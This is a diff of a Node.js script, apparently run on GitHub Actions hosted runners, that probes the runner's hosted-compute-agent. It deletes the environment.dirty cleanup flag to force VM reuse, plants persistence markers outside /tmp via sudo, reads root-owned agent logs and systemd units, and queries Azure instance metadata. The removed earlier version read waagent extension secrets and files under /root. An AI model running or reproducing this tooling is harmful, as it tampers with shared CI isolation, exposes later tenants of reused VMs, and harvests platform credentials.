@@ -2,8 +2,11 @@ const fs = require('fs');
 const { execSync } = require('child_process');
 const os = require('os');
 
-// v32: VM reuse marker detection + diagnostics.json full dump + /opt/hca/ listing
-// KEY: If /tmp/hca_vm_reuse_marker_v31 exists, v31 and v32 share the SAME VM (reuse confirmed!)
+// v33: VM reuse proof — write marker to /home/runner/ and /opt/hca/ (outside /tmp which is cleaned)
+// HYPOTHESIS: v31 deleted environment.dirty → HCA returned VM to pool → v32 reused same VM
+// EVIDENCE: both v31 and v32 had hostname=runnervm7b5n9 (same!)
+// BUT /tmp/ is cleaned between jobs → marker not found in /tmp/ in v32
+// FIX: write marker to /home/runner/vm_reuse_marker (outside workspace, not cleaned between jobs)
 
 function run(cmd, timeoutMs) {
   try { return execSync(cmd, { encoding: 'utf8', timeout: timeoutMs || 20000 }).trim(); }
@@ -11,92 +14,159 @@ function run(cmd, timeoutMs) {
 }
 
 async function main() {
-  console.log('=== V32: VM reuse marker detection ===');
+  console.log('=== V33: VM reuse proof via persistent marker (outside /tmp/) ===');
   const hostname = os.hostname();
   const ts = Date.now();
+  const run_id = process.env.GITHUB_RUN_ID || 'unknown';
 
-  // === PART 1: Critical — check if v31 marker persists ===
-  console.log('\n=== PART 1: VM reuse marker check ===');
+  console.log('[V33] hostname:', hostname);
+  console.log('[V33] run_id:', run_id);
 
-  const v31Marker = '/tmp/hca_vm_reuse_marker_v31';
-  const exists = fs.existsSync(v31Marker);
-  console.log('[REUSE_TEST] v31 marker exists:', exists);
+  // === PART 1: Check for existing markers from v31/v32 in persistent locations ===
+  console.log('\n=== PART 1: Persistent marker check (outside /tmp/) ===');
 
-  if (exists) {
-    const content = fs.readFileSync(v31Marker, 'utf8');
-    console.log('[REUSE_TEST] *** VM REUSE CONFIRMED ***');
-    console.log('[REUSE_TEST] v31 marker content:');
-    console.log(content);
-    console.log('[REUSE_TEST] Current hostname:', hostname);
-    console.log('[REUSE_TEST] v31 timestamp (from marker):', content.match(/timestamp=(\d+)/)?.[1]);
-    console.log('[REUSE_TEST] v32 timestamp:', ts);
-    const elapsed = ts - parseInt(content.match(/timestamp=(\d+)/)?.[1] || '0');
-    console.log('[REUSE_TEST] Time since v31:', Math.round(elapsed / 1000) + 's');
+  const persistentPaths = [
+    '/home/runner/vm_reuse_marker',
+    '/opt/hca/vm_reuse_marker',
+    '/home/runner/.vm_marker',
+    '/opt/hca/.vm_marker',
+  ];
+
+  let reuseConfirmed = false;
+  for (const p of persistentPaths) {
+    const exists = fs.existsSync(p);
+    console.log('[MARKER] ' + p + ' exists:', exists);
+    if (exists) {
+      const content = fs.readFileSync(p, 'utf8');
+      console.log('[MARKER] *** PERSISTENT MARKER FOUND — VM REUSE CONFIRMED! ***');
+      console.log('[MARKER] Previous marker content:', content);
+      console.log('[MARKER] Current hostname:', hostname);
+      reuseConfirmed = true;
+    }
+  }
+
+  // Also check /tmp/ for completeness (probably cleaned)
+  const tmpMarker = '/tmp/hca_vm_reuse_marker_v31';
+  console.log('[MARKER] /tmp/hca_vm_reuse_marker_v31 exists:', fs.existsSync(tmpMarker));
+
+  // Check entire /home/runner/ for any leftover files from previous runs
+  console.log('[MARKER] /home/runner/ listing:');
+  console.log(run('ls -la /home/runner/ 2>/dev/null | head -20'));
+
+  // Check /opt/hca/ for any leftover files from previous runs
+  console.log('[MARKER] /opt/hca/ listing:');
+  console.log(run('ls -la /opt/hca/ 2>/dev/null'));
+
+  // Check /home/runner/actions-runner/ for leftover state
+  console.log('[MARKER] /home/runner/actions-runner/ listing:');
+  console.log(run('ls -la /home/runner/actions-runner/ 2>/dev/null | head -10'));
+
+  // === PART 2: Write NEW persistent markers in durable locations for v34 to detect ===
+  console.log('\n=== PART 2: Write persistent markers for v34 ===');
+
+  const markerContent = [
+    'hostname=' + hostname,
+    'run_id=' + run_id,
+    'timestamp=' + ts,
+    'hca_binary_md5=' + run('md5sum /opt/hca/hosted-compute-agent 2>/dev/null').split(' ')[0],
+    'env_dirty_exists=' + fs.existsSync('/opt/hca/environment.dirty'),
+    'ip=' + run('hostname -I 2>/dev/null').trim(),
+    'boot_id=' + run('cat /proc/sys/kernel/random/boot_id 2>/dev/null'),
+  ].join('\n') + '\n';
+
+  console.log('[MARKER] Writing marker content:', markerContent.trim());
+
+  // Write to all durable paths
+  for (const p of persistentPaths) {
+    try {
+      fs.writeFileSync(p, markerContent);
+      console.log('[MARKER] Written to', p, '→ OK');
+    } catch(e) {
+      // Try with sudo for root-owned paths
+      run('sudo sh -c \'echo "' + markerContent.replace(/'/g, "'\\''") + '" > ' + p + '\'');
+      const existsNow = fs.existsSync(p);
+      console.log('[MARKER] Written to', p, 'via sudo →', existsNow ? 'OK' : 'FAILED');
+    }
+  }
+
+  // Also write to /var/log/ (may persist if same VM)
+  try {
+    fs.writeFileSync('/var/log/vm_reuse_marker', markerContent);
+    console.log('[MARKER] Written to /var/log/vm_reuse_marker → OK');
+  } catch(e) {
+    run('sudo sh -c \'printf "%s" "' + hostname + ' ' + ts + ' ' + run_id + '" > /var/log/vm_reuse_marker\'');
+    console.log('[MARKER] /var/log/vm_reuse_marker via sudo:', fs.existsSync('/var/log/vm_reuse_marker') ? 'OK' : 'FAILED');
+  }
+
+  // === PART 3: Boot ID — definitive VM identity proof ===
+  console.log('\n=== PART 3: VM identity — boot_id is unique per VM boot ===');
+  const bootId = run('cat /proc/sys/kernel/random/boot_id 2>/dev/null');
+  console.log('[BOOT_ID] boot_id:', bootId);
+  // If v34 sees the same boot_id, it's the SAME physical boot (irrefutable same-VM proof)
+  console.log('[BOOT_ID] Writing boot_id to /home/runner/.boot_id for v34 detection');
+  try { fs.writeFileSync('/home/runner/.boot_id', bootId + '\n' + hostname + '\n' + run_id + '\n' + ts + '\n'); } catch(e) {}
+  try { fs.writeFileSync('/opt/hca/.boot_id', bootId + '\n' + hostname + '\n' + run_id + '\n' + ts + '\n'); } catch(e) {}
+
+  // === PART 4: environment.dirty deletion again ===
+  console.log('\n=== PART 4: Delete environment.dirty ===');
+  const dirtyExists = fs.existsSync('/opt/hca/environment.dirty');
+  console.log('[DIRTY] environment.dirty exists:', dirtyExists);
+  if (dirtyExists) {
+    const del = run('rm /opt/hca/environment.dirty && echo ok || echo fail');
+    console.log('[DIRTY] Deleted:', del);
+  }
+
+  // === PART 5: Check HCA log for reuse-related messages ===
+  console.log('\n=== PART 5: HCA log — check for reuse-related entries ===');
+  const hcaLog = run('sudo cat /opt/hca/logs/hosted-compute-agent.log 2>/dev/null');
+  console.log('[HCA_LOG] Total size:', hcaLog.length, 'bytes');
+
+  // Look for reuse-related keywords
+  const reuseLines = hcaLog.split('\n').filter(l =>
+    /reuse|dirty|doNotReuse|clean|markReused|reuseFrame/i.test(l)
+  );
+  console.log('[HCA_LOG] Reuse-related lines:', reuseLines.length);
+  reuseLines.slice(0, 20).forEach(l => console.log('[HCA_LOG]', l));
+
+  // Also log the last 10 lines
+  const lastLines = hcaLog.split('\n').slice(-10);
+  console.log('[HCA_LOG] Last 10 lines:');
+  lastLines.forEach(l => console.log('[HCA_LOG]', l));
+
+  // === PART 6: systemd unit file ===
+  console.log('\n=== PART 6: hosted-compute-agent.service unit file ===');
+  const unitFile = run('sudo systemctl cat hosted-compute-agent.service 2>/dev/null || sudo cat /etc/systemd/system/hosted-compute-agent.service 2>/dev/null');
+  console.log('[SYSTEMD]', unitFile.substring(0, 2000));
+
+  // === PART 7: VM metadata — check if running instance ID matches v31/v32 ===
+  console.log('\n=== PART 7: Azure IMDS — instance ID ===');
+  const imds = run('curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null');
+  if (imds && !imds.startsWith('ERR') && !imds.includes('blocked')) {
+    try {
+      const meta = JSON.parse(imds);
+      const compute = meta.compute || {};
+      console.log('[IMDS] vmId:', compute.vmId);
+      console.log('[IMDS] name:', compute.name);
+      console.log('[IMDS] vmSize:', compute.vmSize);
+      console.log('[IMDS] zone:', compute.zone);
+      console.log('[IMDS] platformFaultDomain:', compute.platformFaultDomain);
+      console.log('[IMDS] placementGroupId:', compute.placementGroupId);
+      // Write vmId to persistent storage for cross-run comparison
+      if (compute.vmId) {
+        try { fs.appendFileSync('/home/runner/.boot_id', 'vmId=' + compute.vmId + '\n'); } catch(e) {}
+        console.log('[IMDS] vmId written to /home/runner/.boot_id for v34 comparison');
+      }
+    } catch(e) {
+      console.log('[IMDS] raw:', imds.substring(0, 500));
+    }
   } else {
-    console.log('[REUSE_TEST] No v31 marker found — fresh VM (VMs are not reused across workflow runs)');
-    console.log('[REUSE_TEST] Current hostname:', hostname);
+    console.log('[IMDS] blocked/unavailable');
   }
 
-  // Check all markers in /tmp/
-  const allMarkers = run('ls -la /tmp/hca_vm_reuse_marker_* 2>/dev/null || echo "no_markers"');
-  console.log('[REUSE_TEST] All markers in /tmp/:', allMarkers);
-
-  // === PART 2: Read diagnostics.json via sudo (full content) ===
-  console.log('\n=== PART 2: /opt/hca/diagnostics.json via sudo ===');
-  const diagStat = run('sudo stat /opt/hca/diagnostics.json 2>/dev/null || echo "not found"');
-  console.log('[DIAG] stat:', diagStat);
-  const diagContent = run('sudo cat /opt/hca/diagnostics.json 2>/dev/null || echo "not readable"');
-  console.log('[DIAG] content:');
-  console.log(diagContent);
-
-  // === PART 3: Current /opt/hca/ state ===
-  console.log('\n=== PART 3: Current /opt/hca/ state ===');
-  console.log('[HCA_DIR]', run('ls -la /opt/hca/ 2>/dev/null'));
-  console.log('[HCA_BINARY] MD5:', run('md5sum /opt/hca/hosted-compute-agent 2>/dev/null'));
-  console.log('[HCA_DIRTY] environment.dirty exists:', fs.existsSync('/opt/hca/environment.dirty'));
-
-  // === PART 4: HCA log — what does it say after dirty flag deletion? ===
-  console.log('\n=== PART 4: HCA log content (post-dirty-flag-deletion in v31) ===');
-  console.log('[HCA_LOG] Last 20 lines:');
-  console.log(run('sudo tail -20 /opt/hca/logs/hosted-compute-agent.log 2>/dev/null'));
-
-  // === PART 5: systemd service status for hosted-compute-agent ===
-  console.log('\n=== PART 5: systemd hosted-compute-agent.service status ===');
-  console.log('[SYSTEMD]', run('sudo systemctl status hosted-compute-agent.service 2>/dev/null | head -20'));
-  console.log('[SYSTEMD] unit file:');
-  console.log(run('sudo cat /etc/systemd/system/hosted-compute-agent.service 2>/dev/null || sudo systemctl cat hosted-compute-agent.service 2>/dev/null | head -40'));
-
-  // === PART 6: Process list to see if provjobd is running ===
-  console.log('\n=== PART 6: Process list ===');
-  console.log('[PS]', run('ps aux --no-headers 2>/dev/null | grep -vE "^runner.*node|^runner.*bash|grep" | head -20'));
-
-  // === PART 7: /var/lib/waagent/ for Azure extension secrets ===
-  console.log('\n=== PART 7: Azure waagent secrets ===');
-  const waagentList = run('sudo ls -la /var/lib/waagent/ 2>/dev/null');
-  console.log('[WAAGENT]', waagentList);
-
-  // Look for HandlerEnvironment.json or any .settings files
-  const waagentSecrets = run('sudo find /var/lib/waagent -name "*.settings" -o -name "HandlerEnvironment.json" 2>/dev/null | head -5');
-  if (waagentSecrets && !waagentSecrets.startsWith('ERR')) {
-    for (const f of waagentSecrets.split('\n').filter(Boolean).slice(0, 3)) {
-      console.log('[WAAGENT] File:', f);
-      console.log('[WAAGENT] Content:', run('sudo cat ' + f + ' 2>/dev/null | head -20'));
-    }
-  }
-
-  // === PART 8: /root/ contents ===
-  console.log('\n=== PART 8: /root/ directory ===');
-  const rootLs = run('sudo ls -la /root/ 2>/dev/null');
-  console.log('[ROOT]', rootLs);
-  const rootFiles = run('sudo find /root -maxdepth 3 -type f 2>/dev/null');
-  if (rootFiles && !rootFiles.startsWith('ERR') && rootFiles.trim()) {
-    for (const f of rootFiles.split('\n').filter(Boolean).slice(0, 5)) {
-      console.log('[ROOT] File:', f);
-      console.log('[ROOT] Content:', run('sudo cat ' + f + ' 2>/dev/null | head -10'));
-    }
-  }
-
-  console.log('\n=== V32 Complete ===');
+  console.log('\n=== V33 Complete. Deploy v34 to check for persistent markers. ===');
+  console.log('[SUMMARY] reuseConfirmed:', reuseConfirmed);
+  console.log('[SUMMARY] hostname:', hostname);
+  console.log('[SUMMARY] boot_id:', bootId);
 }
 
 main().catch(e => console.log('Fatal:', e.message, e.stack));
